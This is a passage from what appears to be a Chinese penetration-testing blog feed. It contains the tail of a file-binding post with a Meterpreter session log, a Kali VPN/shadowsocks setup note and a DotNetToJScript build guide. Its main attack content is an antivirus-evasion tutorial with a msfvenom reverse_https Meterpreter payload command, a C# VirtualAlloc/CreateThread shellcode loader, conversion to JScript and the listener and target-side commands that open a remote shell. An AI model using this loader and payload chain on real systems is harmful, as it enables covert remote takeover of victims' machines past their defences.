alt="virustotal"></p><p>回连测试：</p><ul><li>目标机 Windows 10</li><li>在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器</li><li><img src="/uploads/14.jpg" alt="calc"></li><li>kali 回连 Meteoreter  session </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.youtube.com/watch?v=vHz8QU2Dj9M" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vHz8QU2Dj9M</a></p><p><a href="https://github.com/danielhnmoreno/pyJoiner---GUI-Version" target="_blank" rel="noopener">https://github.com/danielhnmoreno/pyJoiner---GUI-Version</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="payloads" scheme="https://yaalonsong.github.io/tags/payloads/"/>
    
  </entry>
  
  <entry>
    <title>kali安装pptp和shadowsocks客户端</title>
    <link href="https://yaalonsong.github.io/2018/03/06/kali%E5%AE%89%E8%A3%85pptp+shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html"/>
    <id>https://yaalonsong.github.io/2018/03/06/kali安装pptp+shadowsocks客户端.html</id>
    <published>2018-03-06T13:48:16.000Z</published>
    <updated>2018-08-22T17:17:38.350Z</updated>
    
    <content type="html"><![CDATA[<h4 id="kali-安装-pptp-方法"><a href="#kali-安装-pptp-方法" class="headerlink" title="kali 安装 pptp 方法"></a>kali 安装 pptp 方法</h4><h5 id="依次执行以下命令"><a href="#依次执行以下命令" class="headerlink" title="依次执行以下命令"></a>依次执行以下命令</h5><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome</span><br><span class="line">#以上为一条命令来执行</span><br><span class="line">cp /etc/network/interfaces /etc/network/interfaces.backup </span><br><span class="line">echo &quot;auto lo &quot; &gt; /etc/network/interfaces </span><br><span class="line">echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces </span><br><span class="line">/etc/init.d/network-manager restart</span><br></pre></td></tr></table></figure><h4 id="kali安装ss客户端"><a href="#kali安装ss客户端" class="headerlink" title="kali安装ss客户端"></a>kali安装ss客户端</h4><h5 id="Command-line-Client"><a href="#Command-line-Client" class="headerlink" title="Command-line Client"></a>Command-line Client</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br><span class="line">apt-get install shadowsocks-libev</span><br><span class="line">cpan Net::Shadowsocks</span><br><span class="line">sslocal -s 23.154.235.12 -p 8388  -l 1080 -k password -t 600 -m aes-256-cfb</span><br></pre></td></tr></table></figure><p><em>注释：-s 服务器IP，-p为ss配置的端口，-l 本地代理端口，-k为ss配置的密码</em></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;kali-安装-pptp-方法&quot;&gt;&lt;a href=&quot;#kali-安装-pptp-方法&quot; class=&quot;headerlink&quot; title=&quot;kali 安装 pptp 方法&quot;&gt;&lt;/a&gt;kali 安装 pptp 方法&lt;/h4&gt;&lt;h5 id=&quot;依次执行以下命令&quot;&gt;&lt;a href=&quot;#依次执行以下命令&quot; class=&quot;headerlink&quot; title=&quot;依次执行以下命令&quot;&gt;&lt;/a&gt;依次执行以下命令&lt;/h5&gt;
    
    </summary>
    
      <category term="kali" scheme="https://yaalonsong.github.io/categories/kali/"/>
    
    
      <category term="kali" scheme="https://yaalonsong.github.io/tags/kali/"/>
    
      <category term="pptp" scheme="https://yaalonsong.github.io/tags/pptp/"/>
    
      <category term="ss" scheme="https://yaalonsong.github.io/tags/ss/"/>
    
  </entry>
  
  <entry>
    <title>免杀 MSF Windows Payload 的方法与实践（小白视角）</title>
    <link href="https://yaalonsong.github.io/2017/12/22/%E5%85%8D%E6%9D%80%20MSF%20Windows%20Payload%20%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5.html"/>
    <id>https://yaalonsong.github.io/2017/12/22/免杀 MSF Windows Payload 的方法与实践.html</id>
    <published>2017-12-21T16:01:30.000Z</published>
    <updated>2018-08-22T17:19:03.884Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。</p></blockquote><a id="more"></a><h2 id="0x00-制作payload"><a href="#0x00-制作payload" class="headerlink" title="0x00 制作payload"></a>0x00 制作payload</h2><p>使用 kali 里的 msfvenom 生成一个x86的 Meterpreter Payload 命令如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b <span class="meta-string">"\x00\xff"</span> LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe</span></span><br></pre></td></tr></table></figure><p>大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。</p><p>生成结果 <code>cat https.csharp</code> 如图所示，</p><p><img src="/uploads/11.png" alt="payload"></p><h2 id="0x01-创建-c-项目"><a href="#0x01-创建-c-项目" class="headerlink" title="0x01 创建 c# 项目"></a>0x01 创建 c# 项目</h2><p>我们需要创建一个 C# 项目，我使用的是 Visual Studio 2017。新建一个空白的 C# 的控制台应用(.NET Framework)工程，.Net Framework 版本选择 2.0（保证兼容性）。</p><p>将下列代码粘贴覆盖到 Program.cs 中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Threading;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    public class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public Program()</span><br><span class="line">        &#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunMSF()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            //Paste your Payload here</span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);</span><br><span class="line">            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);</span><br><span class="line">            Thread.Sleep(2000);</span><br><span class="line">        &#125;</span><br><span class="line">        public static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将在 kali 生成的 payload 中的十六进制数数组粘贴到代码中注释为“//Paste your Payload here”的下面。</p><p>保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存，如图：</p><p><img src="/uploads/22.png" alt="vs2017"></p><p>增加 Release 版的 x86 编译对象，如图：</p><p><img src="/uploads/33.png" alt="release"></p><p>然后生成出 MSFWrapper.exe ：</p><p><img src="/uploads/44.png" alt="生成exe"></p><h2 id="0x02-将生成的-exe-文件转换成-js-文件"><a href="#0x02-将生成的-exe-文件转换成-js-文件" class="headerlink" title="0x02 将生成的 exe 文件转换成 js 文件"></a>0x02 将生成的 exe 文件转换成 js 文件</h2><p><a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">DotNetToJScript源码下载 </a></p><p><a href="http://s.yl0.org/2017/12/17/开源工具%20DotNetToJScript.html" target="_blank" rel="noopener">开源工具DotNetToJScript详细编译教程</a></p><p>转换命令：</p><p><code>F:\WEB渗透工具&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe</code></p><h2 id="0x03-通过命令执行-js-文件使其弹回-Meterpreter-shell"><a href="#0x03-通过命令执行-js-文件使其弹回-Meterpreter-shell" class="headerlink" title="0x03 通过命令执行 js 文件使其弹回 Meterpreter shell"></a>0x03 通过命令执行 js 文件使其弹回 Meterpreter shell</h2><p>在 kali 里执行命令进行监听：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># msfconsole </span></span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.1.99</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>在目标机器执行如下命令：</p><p><code>C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js</code></p><p>kali 反弹回 meterpreter ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Started HTTPS reverse handler on https://192.168.1.99:443</span><br><span class="line">[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ...</span><br></pre></td></tr></table></figure><p>这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！</p><h2 id="0x04-END"><a href="#0x04-END" class="headerlink" title="0x04 END"></a>0x04 END</h2><p>未完待续 ing……</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="payloads" scheme="https://yaalonsong.github.io/tags/payloads/"/>
    
  </entry>
  
  <entry>
    <title>开源工具DotNetToJScript详细编译教程</title>
    <link href="https://yaalonsong.github.io/2017/12/18/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html"/>
    <id>https://yaalonsong.github.io/2017/12/18/开源工具 DotNetToJScript.html</id>
    <published>2017-12-17T16:05:34.000Z</published>
    <updated>2018-08-22T17:19:09.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。</p><p>工具下载：<a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">下载地址</a></p><a id="more"></a><h2 id="0x01-用到工具"><a href="#0x01-用到工具" class="headerlink" title="0x01 用到工具"></a>0x01 用到工具</h2><p>由于此为开源代码需要自己编译，通过自己的研究终于编译成功。</p><ul><li>使用工具vs2017； </li><li>ndesk-options-0.2.1.bin 文件的引用。</li></ul><h2 id="0x02-编译过程"><a href="#0x02-编译过程" class="headerlink" title="0x02 编译过程"></a>0x02 编译过程</h2><ul><li><p>打开vs2017，点击打开项目/解决方案；<img src="/uploads/3.png" alt="3"></p></li><li><p>打开DotNetToJScript目录下的DotNetToJScript.csproj Visual C#  项目文件；<img src="/uploads/4.png" alt="4"></p></li><li><p>点击Program.cs生成解决方案；</p><p><img src="/uploads/5.png" alt="5"></p></li><li><p>报错缺少程序集引用 NDesk.Options；<img src="/uploads/2.png" alt="2"></p></li><li><p>解决办法</p><p>需要添加引用 NDesk.Options</p><p>下载地址：</p><p><a href="http://www.ndesk.org/archive/ndesk-options/ndesk-options-0.2.1.bin.zip" target="_blank" rel="noopener">点击下载</a>           解压缩，按图添加引用；</p><p><img src="/uploads/1.png" alt="1"></p><p>​</p></li><li><p>浏览—-选择图中文件—-添加；</p><p><img src="/uploads/7.png" alt="7"></p></li><li><p>然后重新生成解决方案即可；<img src="/uploads/8.png" alt="8"></p><p>​</p><p>​</p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h2&gt;&lt;p&gt;James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。&lt;/p&gt;
&lt;p&gt;工具下载：&lt;a href=&quot;https://github.com/tyranid/DotNetToJScript&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
</feed>
